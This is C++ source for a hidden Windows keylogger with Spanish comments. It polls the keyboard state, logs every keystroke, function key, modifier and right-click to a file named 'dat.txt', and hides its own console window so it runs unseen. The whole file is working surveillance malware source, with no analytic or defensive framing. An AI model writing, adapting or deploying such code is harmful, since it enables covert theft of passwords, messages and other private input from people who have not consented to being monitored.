#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

void LOG(std::string input) {
	std::ofstream LogFile("dat.txt", std::ios::app); // Abre el archivo en modo de adjuntar
	if (LogFile.is_open()) {
		if (input == "\b") {
			LogFile.close(); // Cierra el archivo de escritura para desbloquearlo
			std::ifstream archivoLectura("dat.txt");
			std::string contenido;
			
			if (archivoLectura) {
				char c;
				while (archivoLectura.get(c)) {
					contenido += c;
				}
				archivoLectura.close();
			}

			if (!contenido.empty()) {
				contenido.pop_back(); // Elimina el último caracter del contenido
				std::ofstream archivoEscritura("dat.txt");  // Abre el archivo para escritura
				archivoEscritura << contenido;  // Escribe el contenido modificado en el archivo
				archivoEscritura.close();
			}
		} else {
			LogFile << input; // Escribe la entrada en el archivo
			LogFile.close(); // Cierra el archivo de escritura
		}
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n[Enter]\n";
		LOG("\n");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("\n[SHIFT]\n");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("\n[R_CLICK]\n");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("\n[CAPS_LCOK]\n");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("\n[TAB]\n");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("\n[Arriba]\n");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("\n[abajo]\n");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("\n[Izquierda]\n");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("\n[derecha]\n");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("\n[CONTROL]\n");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("\n[ALT]\n");
		return true;
	case VK_PRIOR:
		LOG("\n[PageUp]\n");
		return true;
	case VK_NEXT:
		LOG("\n[PageDown]\n");
		return true;
	case VK_END:
		LOG("\n[Fin]\n");
		return true;
	case VK_DELETE:
		LOG("\n[Supr]\n");
		return true;
	case VK_HOME:
		LOG("\n[Inicio]");
		return true;
	case VK_INSERT:
		LOG("\n[Insert]\n");
		return true;

	default: 
		return false;
	}
}
bool IsShiftPressed() {
	return GetAsyncKeyState(VK_SHIFT) & 0x8000;
}



int main() {
	while (true) {
		Sleep(10);  // Espera durante 10 milisegundos
		// Oculta la ventana de la consola
		ShowWindow(GetConsoleWindow(), SW_HIDE);

		// Verifica si alguna tecla está presionada
		for (int KEY = 8; KEY <= 190; KEY++) {
			if (GetAsyncKeyState(KEY) == -32767) {
				// Verifica si es una tecla especial
				if (SpecialKeys(KEY) == false) {
					// Abre el archivo de registro
					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						// Convertir el código de tecla en un carácter respetando las mayúsculas y minúsculas
						char keyChar;

						if (KEY >= 112 && KEY <= 123) {  // Códigos para F1 a F12
							int f_key = KEY - 111;  // Calcular el número de tecla de función (1 a 12)
							LogFile << "F" << f_key << endl;  // Escribe "F" seguido del número de la tecla de función
						} else {
							keyChar = static_cast<char>(IsShiftPressed() ? KEY : tolower(KEY));
							if (IsShiftPressed() && isalpha(keyChar)) {
								keyChar = toupper(keyChar);  // Convertir a mayúscula si Shift está presionado
							}
							LogFile << keyChar;
						}
						
						LogFile.close(); // Cierra el archivo
					}
				}
			}
		}

	}

	return 0;
}
